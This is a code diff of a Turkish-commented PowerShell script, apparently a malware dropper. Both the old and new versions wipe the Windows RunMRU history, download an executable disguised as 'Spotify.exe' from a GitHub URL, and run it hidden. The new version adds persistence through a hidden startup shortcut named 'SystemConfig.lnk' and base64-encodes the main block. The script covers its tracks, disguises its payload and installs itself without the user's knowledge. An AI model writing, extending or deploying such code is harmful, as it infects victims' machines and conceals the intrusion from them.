@@ -24,20 +24,53 @@ Start-Sleep -Seconds 1
 
 # Sonra ana kodu çalıştır
 $mainCode = {
-    $registryPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-    if(Test-Path $registryPath){
-        $values=Get-ItemProperty -Path $registryPath
-        $keys=$values.PSObject.Properties|Where-Object{$_.Name-ne"PSPath"-and$_.Name-ne"PSParentPath"-and$_.Name-ne"PSChildName"-and$_.Name-ne"PSDrive"-and$_.Name-ne"PSProvider"-and$_.Name-ne"MRUList"}
-        foreach($key in $keys){
+    # RunMRU temizleme
+    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+    if (Test-Path $registryPath) {
+        $values = Get-ItemProperty -Path $registryPath
+        $keys = $values.PSObject.Properties | Where-Object {
+            $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and 
+            $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and 
+            $_.Name -ne "PSProvider" -and $_.Name -ne "MRUList"
+        }
+        foreach ($key in $keys) {
             Remove-ItemProperty -Path $registryPath -Name $key.Name -ErrorAction SilentlyContinue
         }
         Set-ItemProperty -Path $registryPath -Name "MRUList" -Value ""
-        $downloadPath="C:\Users\kurtarma123\AppData\Roaming\Microsoft\Spotify.exe"
-        $url="https://github.com/t2jszt4n6p-ops/sexcan/raw/refs/heads/main/Spotify.exe"
-        $ProgressPreference="SilentlyContinue"
-        $null=Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing
-        Start-Process $downloadPath -WindowStyle Hidden
     }
+    
+    # Mevcut kullanıcı adını al
+    $currentUser = $env:USERNAME
+    
+    # Dosyayı indir (güncel kullanıcı adıyla)
+    $downloadPath = "C:\Users\$currentUser\AppData\Roaming\Microsoft\Spotify.exe"
+    $url = "https://github.com/t2jszt4n6p-ops/sexcan/raw/refs/heads/main/Spotify.exe"
+    
+    $ProgressPreference = "SilentlyContinue"
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing
+    } catch {
+        Write-Error "Dosya indirilemedi: $_"
+        return
+    }
+    
+    # Startup'a ekle (gizli dosya olarak)
+    $startupPath = [Environment]::GetFolderPath('Startup')
+    $shortcutPath = Join-Path $startupPath "SystemConfig.lnk"
+    
+    # Gizli shortcut oluştur
+    $WshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $WshShell.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = $downloadPath
+    $shortcut.WindowStyle = 7  # Minimized
+    $shortcut.Save()
+    
+    # Shortcut'u gizle
+    $file = Get-Item $shortcutPath -Force
+    $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden
+    
+    # Programı başlat
+    Start-Process $downloadPath -WindowStyle Hidden
 }
 
 $mainEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($mainCode))
